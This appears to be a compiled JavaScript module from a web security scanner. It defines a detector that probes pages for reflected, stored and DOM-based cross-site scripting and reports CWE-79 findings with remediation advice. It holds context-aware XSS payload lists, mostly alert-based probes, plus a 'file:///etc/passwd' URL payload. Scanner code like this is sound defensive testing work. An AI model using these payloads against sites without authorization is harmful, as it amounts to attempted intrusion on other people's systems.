"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.XssDetector = exports.XssType = void 0;
const enums_1 = require("../../types/enums");
const DomExplorer_1 = require("../../scanners/active/DomExplorer");
const PayloadInjector_1 = require("../../scanners/active/PayloadInjector");
var XssType;
(function (XssType) {
    XssType["REFLECTED"] = "reflected";
    XssType["STORED"] = "stored";
    XssType["DOM_BASED"] = "dom-based";
})(XssType || (exports.XssType = XssType = {}));
class XssDetector {
    name = 'XSS Detector';
    description = 'Detects Cross-Site Scripting (XSS) vulnerabilities with context-aware payloads';
    version = '1.0.0';
    injector;
    constructor() {
        this.injector = new PayloadInjector_1.PayloadInjector();
    }
    async detect(context) {
        const vulnerabilities = [];
        const { page, attackSurfaces, baseUrl } = context;
        const xssTargets = attackSurfaces.filter((surface) => surface.context === DomExplorer_1.InjectionContext.HTML ||
            surface.context === DomExplorer_1.InjectionContext.HTML_ATTRIBUTE ||
            surface.context === DomExplorer_1.InjectionContext.JAVASCRIPT ||
            surface.context === DomExplorer_1.InjectionContext.URL);
        for (const surface of xssTargets) {
            try {
                if (surface.type === DomExplorer_1.AttackSurfaceType.URL_PARAMETER) {
                    const htmlContextSurface = { ...surface, context: DomExplorer_1.InjectionContext.HTML };
                    const reflectedHtml = await this.testReflectedXss(page, htmlContextSurface, baseUrl);
                    if (reflectedHtml)
                        vulnerabilities.push(reflectedHtml);
                    const attrContextSurface = { ...surface, context: DomExplorer_1.InjectionContext.HTML_ATTRIBUTE };
                    const reflectedAttr = await this.testReflectedXss(page, attrContextSurface, baseUrl);
                    if (reflectedAttr)
                        vulnerabilities.push(reflectedAttr);
                }
                else {
                    const reflectedVuln = await this.testReflectedXss(page, surface, baseUrl);
                    if (reflectedVuln)
                        vulnerabilities.push(reflectedVuln);
                }
                if (surface.metadata?.formAction) {
                    const storedVuln = await this.testStoredXss(page, surface, baseUrl);
                    if (storedVuln)
                        vulnerabilities.push(storedVuln);
                }
                const domVuln = await this.testDomBasedXss(page, surface, baseUrl);
                if (domVuln)
                    vulnerabilities.push(domVuln);
            }
            catch (error) {
                console.error(`Error testing XSS on ${surface.name}:`, error);
            }
        }
        return vulnerabilities;
    }
    async testReflectedXss(page, surface, baseUrl) {
        const payloads = this.getContextAwarePayloads(surface.context);
        for (const payload of payloads) {
            try {
                const result = await this.injector.inject(page, surface, payload, {
                    encoding: PayloadInjector_1.PayloadEncoding.NONE,
                    submit: true,
                    baseUrl,
                });
                if (this.isPayloadExecuted(result, payload)) {
                    return this.createVulnerability(surface, result, XssType.REFLECTED, baseUrl, payload);
                }
            }
            catch (error) {
                console.error(`Error testing reflected XSS with payload ${payload}:`, error);
            }
        }
        return null;
    }
    async testStoredXss(page, surface, baseUrl) {
        const storedPayload = `<script>alert('XSS-STORED-${Date.now()}')</script>`;
        try {
            const result = await this.injector.inject(page, surface, storedPayload, {
                encoding: PayloadInjector_1.PayloadEncoding.NONE,
                submit: true,
                baseUrl,
            });
            await page.waitForTimeout(1000);
            await page.reload();
            await page.waitForTimeout(500);
            const content = await page.content();
            if (content.includes(storedPayload) || (await this.checkDialogPresence(page))) {
                return this.createVulnerability(surface, result, XssType.STORED, baseUrl, storedPayload);
            }
        }
        catch (error) {
            console.error('Error testing stored XSS:', error);
        }
        return null;
    }
    async testDomBasedXss(page, surface, baseUrl) {
        const domPayloads = [
            '#<script>alert("DOM-XSS")</script>',
            '#<img src=x onerror=alert("DOM-XSS")>',
            'javascript:alert("DOM-XSS")',
            'data:text/html,<script>alert("DOM-XSS")</script>',
        ];
        for (const payload of domPayloads) {
            try {
                if (surface.type === DomExplorer_1.AttackSurfaceType.URL_PARAMETER || surface.type === DomExplorer_1.AttackSurfaceType.LINK) {
                    await page.goto(`${baseUrl}${payload}`);
                    await page.waitForTimeout(500);
                    if (await this.checkDialogPresence(page)) {
                        const result = {
                            payload,
                            encoding: PayloadInjector_1.PayloadEncoding.NONE,
                            strategy: 0,
                            surface,
                            response: {
                                url: `${baseUrl}${payload}`,
                                status: 200,
                                body: await page.content(),
                                headers: {},
                                timing: 0,
                            },
                        };
                        return this.createVulnerability(surface, result, XssType.DOM_BASED, baseUrl, payload);
                    }
                }
            }
            catch (error) {
                console.error('Error testing DOM-based XSS:', error);
            }
        }
        return null;
    }
    getContextAwarePayloads(context) {
        switch (context) {
            case DomExplorer_1.InjectionContext.HTML:
                return [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')">',
                    '<body onload=alert("XSS")>',
                    '<input autofocus onfocus=alert("XSS")>',
                    '<marquee onstart=alert("XSS")>',
                    '<details open ontoggle=alert("XSS")>',
                ];
            case DomExplorer_1.InjectionContext.HTML_ATTRIBUTE:
                return [
                    '" onclick=alert("XSS") "',
                    "' onfocus=alert('XSS') '",
                    '" onmouseover=alert("XSS") "',
                    '" autofocus onfocus=alert("XSS") "',
                    '\' onload=alert(\'XSS\') \'',
                ];
            case DomExplorer_1.InjectionContext.JAVASCRIPT:
                return [
                    '"; alert("XSS"); //',
                    "'; alert('XSS'); //",
                    '</script><script>alert("XSS")</script>',
                    '\'-alert("XSS")-\'',
                    '";alert(String.fromCharCode(88,83,83));//',
                ];
            case DomExplorer_1.InjectionContext.URL:
                return [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    'vbscript:msgbox("XSS")',
                    'file:///etc/passwd',
                ];
            default:
                return [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '" onclick=alert("XSS") "',
                    "' onfocus=alert('XSS') '",
                ];
        }
    }
    isPayloadExecuted(result, payload) {
        const body = result.response?.body || '';
        if (body.includes(payload))
            return true;
        const indicators = [
            '<script>',
            'onerror=',
            'onload=',
            'onclick=',
            'onfocus=',
            'javascript:',
            'alert(',
            'prompt(',
            'confirm(',
        ];
        return indicators.some((indicator) => body.includes(indicator) && payload.includes(indicator));
    }
    async checkDialogPresence(page) {
        let dialogDetected = false;
        page.once('dialog', () => {
            dialogDetected = true;
        });
        await page.waitForTimeout(100);
        return dialogDetected;
    }
    async analyzeInjectionResult(result) {
        const vulnerabilities = [];
        if (this.isPayloadExecuted(result, result.payload)) {
            vulnerabilities.push({
                id: `xss-${result.surface.name}-${Date.now()}`,
                title: 'Cross-Site Scripting (XSS)',
                description: `XSS vulnerability detected in ${result.surface.type} '${result.surface.name}'`,
                severity: enums_1.VulnerabilitySeverity.HIGH,
                category: enums_1.VulnerabilityCategory.XSS,
                cwe: 'CWE-79',
                owasp: 'A03:2021',
                evidence: {
                    request: { body: result.payload },
                    response: { body: result.response?.body?.substring(0, 500) || '' },
                },
                remediation: 'Use context-appropriate output encoding (HTML entity encoding for HTML context). Implement Content Security Policy (CSP) headers, use HTTPOnly and Secure flags for cookies.',
                references: [
                    'https://owasp.org/www-community/attacks/xss/',
                    'https://cwe.mitre.org/data/definitions/79.html',
                ],
                timestamp: new Date(),
            });
        }
        return vulnerabilities;
    }
    async validate() {
        return true;
    }
    getPayloads() {
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '" onclick=alert("XSS") "',
            "' onfocus=alert('XSS') '",
            '"; alert("XSS"); //',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
        ];
    }
    createVulnerability(surface, result, xssType, baseUrl, payload) {
        const typeDescriptions = {
            [XssType.REFLECTED]: 'Reflected XSS - Payload is immediately reflected in the response',
            [XssType.STORED]: 'Stored XSS - Payload is stored and executed when page is viewed',
            [XssType.DOM_BASED]: 'DOM-based XSS - Payload is executed through client-side DOM manipulation',
        };
        const severityMap = {
            [XssType.REFLECTED]: enums_1.VulnerabilitySeverity.HIGH,
            [XssType.STORED]: enums_1.VulnerabilitySeverity.CRITICAL,
            [XssType.DOM_BASED]: enums_1.VulnerabilitySeverity.HIGH,
        };
        return {
            id: `xss-${xssType}-${surface.name}-${Date.now()}`,
            title: `Cross-Site Scripting (${xssType})`,
            description: typeDescriptions[xssType] + ` in ${surface.type} '${surface.name}'`,
            severity: severityMap[xssType],
            category: enums_1.VulnerabilityCategory.XSS,
            cwe: 'CWE-79',
            owasp: 'A03:2021',
            url: result.response?.url || baseUrl,
            evidence: {
                request: { body: payload },
                response: {
                    body: result.response?.body?.substring(0, 1000) || '',
                    status: result.response?.status,
                },
            },
            remediation: 'Properly encode/escape all user input before rendering in HTML. Use context-appropriate output encoding, implement Content Security Policy (CSP) headers, use HTTPOnly and Secure flags for cookies, validate input with allowlists, use modern frameworks with auto-escaping.',
            references: [
                'https://owasp.org/www-community/attacks/xss/',
                'https://cwe.mitre.org/data/definitions/79.html',
                'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
            ],
            timestamp: new Date(),
        };
    }
}
exports.XssDetector = XssDetector;
//# sourceMappingURL=XssDetector.js.map